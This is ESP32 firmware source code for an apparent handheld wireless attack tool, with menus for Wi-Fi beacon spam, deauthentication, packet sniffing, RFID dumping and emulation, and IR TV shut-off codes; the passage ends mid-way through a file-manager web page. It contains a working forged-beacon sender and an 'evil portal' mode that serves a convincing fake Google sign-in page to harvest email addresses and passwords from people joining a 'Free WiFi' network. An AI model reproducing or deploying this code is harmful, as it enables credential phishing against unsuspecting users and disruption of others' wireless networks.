#include <SPI.h>
#include <MFRC522.h>
#include <TJpg_Decoder.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <LittleFS.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <NimBLEDevice.h>
#include <NimBLEBeacon.h>
#include <IRremoteESP8266.h>
#include <IRrecv.h>
#include <IRsend.h>
#include <IRutils.h>
#include <Arduino.h>
#include "config.h"
#include "display_wrapper.h"
#include "button_wrapper.h"

DisplayWrapper display;
ButtonWrapper buttons;
DNSServer dnsServer;

void renderMenu(const char* title, const char* items[], const uint8_t* icons[], int count, int sel) {
  display.fillRect(0, 0, 128, 12, WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(1);
  display.setCursor(4, 2);
  display.print(title);
  display.setTextColor(WHITE);

  int maxVisible = 3;
  int startIdx = 0;
  if (sel >= maxVisible) startIdx = sel - maxVisible + 1;

  for (int i = 0; i < maxVisible; i++) {
    int idx = startIdx + i;
    if (idx >= count) break;

    int yPos = 13 + (i * 13);
    bool isSelected = (idx == sel);

    if (isSelected) {
      display.fillRect(0, yPos, 128, 13, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }

    if (icons != nullptr && icons[idx] != nullptr) {
      display.drawBitmap(2, yPos + 2, icons[idx], 8, 8, isSelected ? BLACK : WHITE);
    }

    display.setCursor(icons != nullptr ? 14 : 4, yPos + 2);
    display.print(items[idx]);

    if (isSelected) {
      display.setCursor(118, yPos + 2);
      display.print(">");
    }
  }

  display.drawLine(0, 54, 128, 54, WHITE);
  display.setCursor(0, 56);
  display.print("[N]Next");
  display.setCursor(80, 56);
  display.print("[OK]Select");
}

void drawHeader(String t) {
  display.fillRect(0, 0, 128, 12, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 2);
  display.print(t);
  display.setTextColor(WHITE);
}

void drawActiveScreen(const char* title, const char* status, const char* info1, const char* info2, const char* btnHint) {
  display.clearDisplay();
  
  display.fillRect(0, 0, 128, 12, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 2);
  display.print(title);
  
  display.setTextColor(WHITE);
  display.setCursor(4, 18);
  display.print(status);
  
  if (info1 != nullptr) {
    display.setCursor(4, 32);
    display.print(info1);
  }
  
  if (info2 != nullptr) {
    display.setCursor(4, 42);
    display.print(info2);
  }
  
  display.drawLine(0, 54, 128, 54, WHITE);
  display.setCursor(4, 56);
  display.print(btnHint);
}

// ===== ИКОНКИ 8x8 =====
const uint8_t ico_wifi[] PROGMEM = {
  0b00111100,
  0b01000010,
  0b10011001,
  0b00100100,
  0b01011010,
  0b00000000,
  0b00011000,
  0b00011000
};

const uint8_t ico_ble[] PROGMEM = {
  0b00001000,
  0b00001100,
  0b10001010,
  0b01001100,
  0b00101000,
  0b01001100,
  0b10001010,
  0b00001000
};

const uint8_t ico_ir[] PROGMEM = {
  0b00000000,
  0b00111100,
  0b01000010,
  0b10011001,
  0b10100101,
  0b10011001,
  0b01000010,
  0b00111100
};

const uint8_t ico_rfid[] PROGMEM = {
  0b01111110,
  0b10000001,
  0b10111101,
  0b10100101,
  0b10100101,
  0b10111101,
  0b10000001,
  0b01111110
};

const uint8_t ico_files[] PROGMEM = {
  0b01111000,
  0b11111100,
  0b10000010,
  0b10000010,
  0b10000010,
  0b10000010,
  0b10000010,
  0b11111110
};

const uint8_t ico_info[] PROGMEM = {
  0b00111100,
  0b01111110,
  0b01111110,
  0b00011000,
  0b00011000,
  0b00000000,
  0b00011000,
  0b00011000
};

const uint8_t ico_settings[] PROGMEM = {
  0b00011000,
  0b01111110,
  0b10111101,
  0b11100111,
  0b11100111,
  0b10111101,
  0b01111110,
  0b00011000
};

const uint8_t ico_back[] PROGMEM = {
  0b00010000,
  0b00110000,
  0b01110000,
  0b11111110,
  0b11111110,
  0b01110000,
  0b00110000,
  0b00010000
};

const uint8_t ico_scan[] PROGMEM = {
  0b11100000,
  0b10100000,
  0b11100000,
  0b00011100,
  0b00010100,
  0b00011100,
  0b00000000,
  0b11111111
};

const uint8_t ico_attack[] PROGMEM = {
  0b00001000,
  0b00011100,
  0b00111110,
  0b01111111,
  0b00011100,
  0b00011100,
  0b00011100,
  0b00000000
};

const uint8_t ico_sniff[] PROGMEM = {
  0b00000000,
  0b01111110,
  0b10000001,
  0b10111101,
  0b10111101,
  0b10000001,
  0b01111110,
  0b00000000
};

const uint8_t ico_ap[] PROGMEM = {
  0b00011000,
  0b00111100,
  0b01100110,
  0b11000011,
  0b00011000,
  0b00111100,
  0b00011000,
  0b00011000
};

const uint8_t ico_beacon[] PROGMEM = {
  0b10000001,
  0b01000010,
  0b00100100,
  0b00011000,
  0b00011000,
  0b00100100,
  0b01000010,
  0b10000001
};

const uint8_t ico_deauth[] PROGMEM = {
  0b11111111,
  0b10000001,
  0b10111101,
  0b10100101,
  0b10100101,
  0b10111101,
  0b10000001,
  0b11111111
};

const uint8_t ico_read[] PROGMEM = {
  0b01111110,
  0b10000001,
  0b10000001,
  0b10111101,
  0b10111101,
  0b10000001,
  0b10000001,
  0b01111110
};

const uint8_t ico_dump[] PROGMEM = {
  0b11111111,
  0b10000001,
  0b10000001,
  0b10000001,
  0b11111111,
  0b00100100,
  0b00100100,
  0b00111100
};

const uint8_t ico_format[] PROGMEM = {
  0b11111111,
  0b10000001,
  0b10111101,
  0b10000001,
  0b10000001,
  0b10111101,
  0b10000001,
  0b11111111
};

const uint8_t ico_emulate[] PROGMEM = {
  0b00111100,
  0b01000010,
  0b10100101,
  0b10011001,
  0b10011001,
  0b10100101,
  0b01000010,
  0b00111100
};

const uint8_t ico_terminal[] PROGMEM = {
  0b11111111,
  0b10000001,
  0b10110001,
  0b10001101,
  0b10110001,
  0b10000001,
  0b10000001,
  0b11111111
};

WebServer server(80);

String serialBuffer = "";

#define SS_PIN    RFID_SS_PIN
#define RST_PIN   RFID_RST_PIN
#define SCK_PIN   RFID_SCK_PIN
#define MISO_PIN  RFID_MISO_PIN
#define MOSI_PIN  RFID_MOSI_PIN

MFRC522 rfid(SS_PIN, RST_PIN);

int cachedFileCount = 0;
String fileList[20];

String target_ssid = "";
int target_rssi = 0;

String lastUid = "";

int scrollOffset = 0;  
float smoothScrollY = 0;  
float smoothY = 18.0; 

int wifiPowerIdx = 4;
int blePowerIdx = 5;
const int wifiPowerLevels[] = {8, 20, 40, 60, 78}; 
const char* wifiPowerNames[] = {"Min", "Low", "Med", "High", "Max"};

int brightIdx = 4; 
const char* brightNames[] = {"1%", "10%", "50%", "75%", "100%"};
const uint8_t brightValues[] = {1, 25, 127, 190, 255}; 

const uint16_t kRecvPin = IR_RECV_PIN;
const uint16_t kSendPin = IR_SEND_PIN;

String lastProbeSSID = "";
int probesCount = 0;
int currentCh = 1;

#define BTN_NEXT BTN_NEXT_PIN
#define BTN_OK   BTN_OK_PIN

unsigned long lastPress = 0;
const int debounceDelay = 220; 

void applyWifiPower() {
  esp_wifi_set_max_tx_power(wifiPowerLevels[wifiPowerIdx]);
}

void applyBlePower() {
  if (NimBLEDevice::getAdvertising() != nullptr) {
    NimBLEDevice::setPower(blePowerIdx); 
  }
}

enum State { 
  MAIN_MENU, WIFI_MENU, WIFI_SCAN_LIST, WIFI_ATTACKS, 
  BEACON_SOURCE, BEACON_COUNT_SEL, BEACON_FILE_SEL, BEACON_RUN,
  DEAUTH_LIST, DEAUTH_RUN, BLE_MENU, BLE_RUN,
  FILES_MENU, LITTLEFS_LIST, RFID_MENU, RFID_EMULATION, FORMAT_CARD, RFID_DUMP_PROCESS, RFID_RECV, FILE_OPTIONS, FILE_CONTENT, WEBUI_ACTIVE, TV_B_GONE_MODE, SYSTEM_INFO, PWN_MODE, SNIFFERS_MENU, PROBE_SNIFFER, BEACON_SNIFFER, CH_GRAPH, IR_MENU, IR_RECV, IR_SEND_LAST, SETTINGS_SCREEN, WIFI_INFO_SCREEN, EVIL_PORTAL
};
State currentState = MAIN_MENU;

IRrecv irrecv(kRecvPin);
IRsend irsend(kSendPin);
decode_results results;

uint32_t lastIrCode = 0;
decode_type_t lastIrProtocol = UNKNOWN;

int menuIndex = 0, scrollIndex = 0, foundDevices = 0;
int beaconCount = 10; 
uint32_t pktCount = 0;
uint8_t target_mac[6];
int target_ch = 1;
String selectedFile = "";
String currentPath = "/";
File uploadFile;
String beaconSSIDs[30]; 
int actualBeaconSSIDs = 0;
String ble_mode_name = "";
bool selectModeForPwn = false;

struct IRCode {
  decode_type_t type;
  uint32_t address; 
  uint64_t command;
  uint8_t bits;
  const char* name;
};

const IRCode tvCodes[] PROGMEM = {
  {SAMSUNG, 0x0707, 0x02, 32, "Samsung"},
  {LG, 0x0, 0x08, 28, "LG"},
  {SONY, 0x1, 0x15, 12, "Sony 12b"},
  {SONY, 0x1, 0x15, 15, "Sony 15b"},
  {SONY, 0x1, 0x15, 20, "Sony 20b"},
  {PANASONIC, 0x4004, 0x100BCBD, 48, "Panasonic"},
  {NEC, 0x0, 0x40BF12ED, 32, "TCL (NEC1)"},
  {NEC, 0x0, 0x20DF10EF, 32, "TCL Roku"},
  {NEC, 0x0, 0x02FD48B7, 32, "TCL/Thomson"},
  {RC6, 0x0, 0xC, 20, "TCL/Alcatel"},
  {NEC, 0x0, 0xF740BF, 32, "NEC Universal"},
  {NEC, 0x0, 0x00FF, 32, "NEC Alt"},
  {NEC, 0x0, 0x4FB2, 32, "Toshiba/Insignia"},
  {NEC, 0x0, 0xFB040707, 32, "Hisense"},
  {NEC, 0x0, 0xBF4012ED, 32, "Haier/Skyworth"},
  {NEC, 0x4, 0x08, 32, "Akai/DEXP"},
  {NEC, 0x1, 0xD2, 32, "Supra/BBK"},
  {RC5, 0x0, 0x0C, 12, "Philips RC5"}, 
  {SHARP, 0x1, 0x41, 15, "Sharp"},
  {WHYNTER, 0x0, 0x820, 32, "Projectors/AC"}
};

int countFiles() {
  int c = 0; File r = LittleFS.open("/"); 
  if(!r) return 0;
  File f = r.openNextFile();
  while(f){ c++; f = r.openNextFile(); } 
  r.close(); return c;
}

String getFileName(int idx) {
  File r = LittleFS.open("/");
  for(int i = 0; i <= idx; i++){ 
    File f = r.openNextFile(); 
    if(i == idx) { String n = f.name(); f.close(); r.close(); return n; }
    f.close();
  }
  r.close(); return "";
}

void sendBeacon(String ssid) {
  uint8_t packet[128];
  int ssid_len = ssid.length();
  if (ssid_len > 32) ssid_len = 32;

  uint8_t beaconHeader[] = {
    0x80, 0x00,                                      // Frame Control
    0x00, 0x00,                                      // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Source MAC (заменим на random)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID (заменим на random)
    0x00, 0x00,                                      // Sequence
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                                      // Beacon Interval (100 TU)
    0x11, 0x04,                                      // Capability
    0x00, (uint8_t)ssid_len                         // SSID Tag
  };

  memcpy(packet, beaconHeader, sizeof(beaconHeader));
  
  // Рандомный MAC
  uint8_t rndMac[6];
  for(int i=0; i<6; i++) rndMac[i] = random(256);
  rndMac[0] &= 0xFE; // Unicast
  rndMac[0] |= 0x02; // Locally administered
  
  memcpy(packet + 10, rndMac, 6); // Source
  memcpy(packet + 16, rndMac, 6); // BSSID

  // SSID
  memcpy(packet + sizeof(beaconHeader), ssid.c_str(), ssid_len);
  
  // Supported Rates
  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(packet + sizeof(beaconHeader) + ssid_len, rates, sizeof(rates));
  
  // DS Parameter Set (канал)
  uint8_t dsParam[] = {0x03, 0x01, (uint8_t)WiFi.channel()};
  memcpy(packet + sizeof(beaconHeader) + ssid_len + sizeof(rates), dsParam, sizeof(dsParam));

  int totalLen = sizeof(beaconHeader) + ssid_len + sizeof(rates) + sizeof(dsParam);

  esp_wifi_80211_tx(WIFI_IF_STA, packet, totalLen, false);
}

void runTVBGone() {
  int codeCount = sizeof(tvCodes) / sizeof(IRCode);
  
  display.clearDisplay();
  display.setCursor(10, 30);
  display.print("Running IR codes...");
  display.display();
  delay(500);

  for (int i = 0; i < codeCount; i++) {
    yield();

    display.fillRect(0, 20, 128, 44, BLACK); 
    display.setCursor(0, 25);
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.print("Sending: ");
    display.println(tvCodes[i].name);
    
    int bar = map(i, 0, codeCount - 1, 0, 120);
    display.drawRect(4, 45, 120, 8, WHITE);
    display.fillRect(6, 47, bar, 4, WHITE);
    display.display();

    if (tvCodes[i].type == PANASONIC) {
      irsend.sendPanasonic(tvCodes[i].address, tvCodes[i].command);
    } else {
      irsend.send(tvCodes[i].type, tvCodes[i].command, tvCodes[i].bits);
    }
    
    delay(200);

    if (digitalRead(BTN_OK) == LOW) {
      return; 
    }
  }
  
  currentState = IR_MENU;
}

void sniffer_probes_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  
  if (payload[0] == 0x40) {
    int ssid_len = payload[25];
    if (ssid_len > 0 && ssid_len <= 32) {
      char ssid[33];
      memcpy(ssid, &payload[26], ssid_len);
      ssid[ssid_len] = '\0';
      String s = String(ssid);
      if (s != lastProbeSSID) {
        lastProbeSSID = s;
        probesCount++;
      }
    }
  }
}

String lastBeaconSSID = "";
int beaconsFound = 0;

void sniffer_beacons_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  
  if (payload[0] == 0x80) { 
    int ssid_len = payload[37];
    if (ssid_len > 0) {
      char ssid[33];
      memcpy(ssid, &payload[38], ssid_len);
      ssid[ssid_len] = '\0';
      lastBeaconSSID = String(ssid);
    } else {
      lastBeaconSSID = "<HIDDEN NETWORK>";
    }
    beaconsFound++;
  }
}

void drawChannelGraph() {
  drawHeader(selectModeForPwn ? "Select Ch for Pwn" : "Wi-Fi Channels");

  int counts[15] = {0};
  int maxCount = 0;

  for (int i = 0; i < foundDevices; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13) {
      counts[ch]++;
      if (counts[ch] > maxCount) maxCount = counts[ch];
    }
  }
  
  for (int i = 1; i <= 13; i++) {
    int h = (maxCount > 0) ? map(counts[i], 0, maxCount, 0, 35) : 0;
    int x = i * 9 - 4;
    
    display.fillRect(x, 52 - h, 6, h, WHITE);
    
    if (selectModeForPwn && i == (menuIndex + 1)) {
       display.drawRect(x - 2, 14, 10, 40, WHITE); 
    }

    display.setCursor(x, 55);
    display.setTextSize(0); 
    display.print(i);
  }
}



void handleFileCreate() {
  String path = server.arg("path");
  if (path.length() > 0) {
    if (!path.startsWith("/")) path = "/" + path;
    File f = LittleFS.open(path, "w");
    if (f) {
      f.print("");
      f.close();
      server.send(200, "text/html", "File/Folder created successfully! <a href='/'>Go back</a>");
    } else {
      server.send(500, "text/plain", "Create error.");
    }
  }
}

void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    Serial.print("handleFileUpload Name: "); Serial.println(filename);
    uploadFile = LittleFS.open(filename, "w");
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (uploadFile) uploadFile.write(upload.buf, upload.currentSize);
  } else if (upload.status == UPLOAD_FILE_END) {
    if (uploadFile) uploadFile.close();
    Serial.print("handleFileUpload Size: "); Serial.println(upload.totalSize);
  }
}

void handleRoot() {
  if (currentState == EVIL_PORTAL) {
    // Заголовки для captive portal
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");
    
    String html = R"(<!doctypehtml><meta charset=utf-8><title>Sign in with Google</title><meta content="width=device-width,initial-scale=1"name=viewport><base href=/ ><link href="data:image/svg+xml,%3Csvg viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ccircle cx='24' cy='24' r='22' fill='%23fff'/%3E%3Cdefs%3E%3Cpath id='b' d='M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-8-13 13s5.13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z'/%3E%3C/defs%3E%3CclipPath id='a'%3E%3Cuse overflow='visible' xlink:href='%23b'/%3E%3C/clipPath%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37V11l17 13z' clip-path='url(%23a)' fill='%23FBBC05'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 11l17 13 7-6.1L48 14V0H0z' clip-path='url(%23a)' fill='%23EA4335'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37l30-23 7.9 1L48 0v48H0z' clip-path='url(%23a)' fill='%2334A853'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='m48 48-31-24-4-3 35-10z' clip-path='url(%23a)' fill='%234285F4'/%3E%3C/svg%3E"rel=icon type=image/svg+xml><style>body{position:relative;margin:0;font-family:Arial,Helvetica,sans-serif;scroll-behavior:smooth}.container{display:flex;height:100vh;user-select:none}.card{background:#fff;width:412px;height:auto;padding:48px 36px;border-radius:8px;border:1px solid #cacaca;margin:auto}.header{text-align:center;font-weight:400}.title{padding:15px 0;font-size:24px}.tagline{font-size:16px;padding-bottom:18px}label{display:block;position:absolute;padding:0 5px;width:auto;color:#5f6368;background:#fff;transition:all 150ms ease;transform:translate(12px,-37px);cursor:text}input{padding:16px;margin-top:20px;font-size:17px;background:#fff;width:calc(100% - 36px);border:1px solid #cacaca;border-radius:5px}input:focus{outline:0;padding:15px;border:2px solid #1a73e8}input:focus+label,input:not(:placeholder-shown)+label{transform:translate(8px,-62px);font-size:13px}input:focus+label{color:#1a73e8}.links{color:#1a73e8;font-size:14px;padding-top:10px;cursor:pointer;font-weight:500}.guest{margin-top:32px;font-size:14px;color:#5f6368}.login-bar{margin-top:32px;display:flex;flex-wrap:wrap}.next{margin-left:auto;padding:10px 30px;border-radius:5px;cursor:pointer;color:#fff;outline:0;border:none;background:#1a73e8;font-weight:600}.next:hover{background:#4285f4}.cr{font-weight:600}@media only screen and (max-width:600px){.card{border:none}}.footer{position:absolute;right:0;bottom:0;left:0;padding:1rem;text-align:center}.footer .links{color:#3c4043;font-size:14px;margin:0 .5rem}</style><div class=container><div class=card><div class=header><svg aria-hidden=true height=24 viewBox="0 0 75 24"width=75 xmlns=http://www.w3.org/2000/svg><g id=qaEJec><path d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"fill=#ea4335></path></g><g id=YGlOvc><path d=M58.193.67h2.564v17.44h-2.564z fill=#34a853></path></g><g id=BWfIk><path d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"fill=#4285f4></path></g><g id=e6m3fd><path d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"fill=#fbbc05></path></g><g id=vbkDmc><path d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"fill=#ea4335></path></g><g id=idEJde><path d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"fill=#4285f4></path></g></svg><div class=title>Sign in</div><div class=tagline>Use your Google Account to access this Free WiFi.</div></div><form action=/get id=email-form-step><input id=name name=email placeholder=" "required autofocus> <label for=name>Email or phone</label> <input id=pass name=password placeholder=" "required type=password> <label for=pass>Password</label><div class=links>Forgot password?</div><div class=guest>Not your computer? Use Guest mode to sign in privately.</div><div class=links>Learn more</div><div class=login-bar><div class="links cr">Create account</div><button class=next type=submit>Next</button></div></form></div><div class=footer><span class=links>Help</span> <span class=links>Privacy</span> <span class=links>Terms</span></div></div>)";
    server.send(200, "text/html", html);
    return;
  }
  
  String html = R"(
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>KFW Manager</title>
<link href='https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap' rel='stylesheet'>
<link href='https://fonts.googleapis.com/icon?family=Material+Icons+Round' rel='stylesheet'>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { 
    font-family: 'Roboto', sans-serif; font-weight: 700;
    background: #1a1210; color: #ede0d4; min-height: 100vh; padding: 16px;
  }

  .top-bar {
    background: #2c1e15; padding: 16px 20px; border-radius: 28px;
    margin-bottom: 16px; display: flex; align-items: center; gap: 14px;
    box-shadow: 0 4px 16px #0006;
    max-width: 580px; margin: 0 auto 16px;
  }
  .top-bar .icon { 
    width: 48px; height: 48px; border-radius: 50%;
    background: #ff8c42; display: flex; align-items: center; justify-content: center;
    box-shadow: 0 4px 12px #ff8c4266;
  }
  .top-bar .icon span { color: #1a1210; font-size: 26px; }
  .top-bar h1 { font-size: 22px; font-weight: 700; color: #ede0d4; }
  .top-bar p { font-size: 12px; color: #a08070; margin-top: 2px; }

  .tabs {
    display: flex; gap: 8px; max-width: 580px; margin: 0 auto 16px;
  }
  .tab {
    flex: 1; padding: 12px; border-radius: 50px; border: none;
    background: #2c1e15; color: #a08070; cursor: pointer;
    font-family: 'Roboto', sans-serif; font-weight: 700; font-size: 14px;
    display: flex; align-items: center; justify-content: center; gap: 8px;
    transition: all 0.2s; box-shadow: 0 4px 16px #0004;
  }
  .tab.active { background: #ff8c42; color: #1a1210; box-shadow: 0 4px 12px #ff8c4244; }
  .tab:hover:not(.active) { background: #3a2518; color: #ede0d4; }

  .tab-content { display: none; }
  .tab-content.active { display: block; }

  .card {
    background: #2c1e15; border-radius: 28px; padding: 22px;
    max-width: 580px; margin: 0 auto 14px; box-shadow: 0 4px 16px #0004;
  }

  .card-title {
    font-size: 11px; font-weight: 700; letter-spacing: 2px;
    text-transform: uppercase; color: #ff8c42; margin-bottom: 16px;
    display: flex; align-items: center; gap: 8px;
  }
  .card-title span { font-size: 18px; }

  .form-row { display: flex; gap: 10px; align-items: center; }

  input[type=text] {
    flex: 1; background: #1a1210; border: 1.5px solid #4a3020;
    color: #ede0d4; padding: 13px 18px; border-radius: 50px;
    font-family: 'Roboto', sans-serif; font-size: 14px; font-weight: 500;
    outline: none; transition: border-color 0.2s;
  }
  input[type=text]:focus { border-color: #ff8c42; box-shadow: 0 0 0 3px #ff8c4222; }
  input[type=text]::placeholder { color: #6a5040; }

  .btn {
    background: #ff8c42; color: #1a1210; border: none;
    padding: 13px 22px; border-radius: 50px; cursor: pointer;
    font-family: 'Roboto', sans-serif; font-weight: 700; font-size: 14px;
    transition: all 0.2s; white-space: nowrap;
    box-shadow: 0 4px 12px #ff8c4244;
  }
  .btn:hover { background: #ffaa6e; box-shadow: 0 6px 18px #ff8c4466; transform: translateY(-1px); }
  .btn:active { transform: translateY(0); }
  .btn.outlined {
    background: transparent; border: 1.5px solid #ff8c42; color: #ff8c42;
    box-shadow: none;
  }
  .btn.outlined:hover { background: #ff8c4222; box-shadow: none; transform: none; }

  input[type=file] { display: none; }
  .file-label {
    display: inline-flex; align-items: center; gap: 6px;
    background: transparent; border: 1.5px solid #ff8c42; color: #ff8c42;
    padding: 12px 20px; border-radius: 50px; cursor: pointer;
    font-size: 14px; font-weight: 700; transition: all 0.2s; white-space: nowrap;
  }
  .file-label:hover { background: #ff8c4222; }
  #fname { font-size: 13px; color: #6a5040; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

  .file-pill {
    display: flex; justify-content: space-between; align-items: center;
    background: #1a1210; border-radius: 20px; padding: 10px 10px 10px 14px;
    margin-bottom: 8px; transition: background 0.15s;
    border: 1.5px solid #2c2015;
  }
  .file-pill:hover { background: #221810; border-color: #ff8c4233; }

  .file-left { display: flex; align-items: center; gap: 12px; }
  .file-icon {
    width: 42px; height: 42px; border-radius: 14px;
    display: flex; align-items: center; justify-content: center;
    background: #3a2518; flex-shrink: 0;
  }
  .file-icon span { color: #ff8c42; font-size: 22px; }
  .file-icon.pcap { background: #3a1818; }
  .file-icon.pcap span { color: #ff6b6b; }

  .file-name { font-size: 14px; color: #ede0d4; font-weight: 500; word-break: break-all; }
  .file-size { font-size: 12px; color: #6a5040; margin-top: 2px; }

  .chip {
    display: inline-block; font-size: 10px; font-weight: 700;
    padding: 2px 10px; border-radius: 50px; margin-left: 8px;
    background: #3a2518; color: #ff8c42; letter-spacing: 1px;
  }
  .chip.pcap { background: #3a1818; color: #ff6b6b; }

  .file-actions { display: flex; gap: 4px; flex-shrink: 0; }
  .icon-btn {
    width: 38px; height: 38px; border-radius: 50%; border: none;
    background: transparent; color: #a08070; cursor: pointer;
    display: flex; align-items: center; justify-content: center;
    transition: all 0.2s; text-decoration: none;
  }
  .icon-btn span { font-size: 20px; }
  .icon-btn:hover { background: #ff8c4222; color: #ff8c42; }
  .icon-btn.del:hover { background: #ff6b6b22; color: #ff6b6b; }

  .empty { 
    text-align: center; padding: 30px; color: #4a3020; font-size: 14px;
    display: flex; flex-direction: column; align-items: center; gap: 8px;
  }
  .empty span { font-size: 40px; opacity: 0.4; }

  /* Console */
  .console-box {
    background: #0e0c0b; border-radius: 20px; padding: 16px;
    font-family: 'Courier New', monospace; font-size: 12px; font-weight: 400;
    color: #ff8c42; min-height: 300px; max-height: 400px;
    overflow-y: auto; white-space: pre-wrap; word-break: break-all;
    border: 1.5px solid #2c2015; margin-bottom: 12px;
    line-height: 1.6;
  }
  .console-actions { display: flex; gap: 8px; justify-content: flex-end; }
</style>
<script>
  function ren(oldN) {
    var newN = prompt('Rename to:', oldN);
    if(newN) location.href = '/rename?old=' + oldN + '&new=' + newN;
  }

  function switchTab(tab) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.getElementById('tab-' + tab).classList.add('active');
    document.getElementById('content-' + tab).classList.add('active');
  }

  function fetchConsole() {
    fetch('/serial').then(r => r.text()).then(t => {
      var box = document.getElementById('console-box');
      box.textContent = t || 'No output yet...';
      box.scrollTop = box.scrollHeight;
    });
  }

  function clearConsole() {
    fetch('/serial-clear').then(() => fetchConsole());
  }

  var consoleInterval = null;
  function startConsole() {
    fetchConsole();
    if (!consoleInterval) consoleInterval = setInterval(fetchConsole, 1000);
  }

  window.onload = function() {
    switchTab('files');
  }
</script>
</head>
<body>
<div style='max-width:580px;margin:0 auto;'>

  <div class='top-bar'>
    <div class='icon'><span class='material-icons-round'>router</span></div>
    <div>
      <h1>KFW Manager</h1>
      <p>ESP32 · LittleFS</p>
    </div>
  </div>

  <div class='tabs'>
    <button class='tab active' id='tab-files' onclick='switchTab("files")'>
      <span class='material-icons-round' style='font-size:18px;'>folder</span> Files
    </button>
    <button class='tab' id='tab-console' onclick='switchTab("console"); startConsole();'>
      <span class='material-icons-round' style='font-size:18px;'>terminal</span> Console
    </button>
  </div>

  <!-- FILES TAB -->
  <div class='tab-content active' id='content-files'>
    <div class='card'>
      <div class='card-title'><span class='material-icons-round'>add_circle</span> Create File</div>
      <form method='POST' action='/create'>
        <div class='form-row'>
          <input type='text' name='path' placeholder='/filename.txt'>
          <input class='btn' type='submit' value='Create'>
        </div>
      </form>
    </div>

    <div class='card'>
      <div class='card-title'><span class='material-icons-round'>upload</span> Upload File</div>
      <form method='POST' action='/upload' enctype='multipart/form-data'>
        <div class='form-row'>
          <label class='file-label' for='fu'>
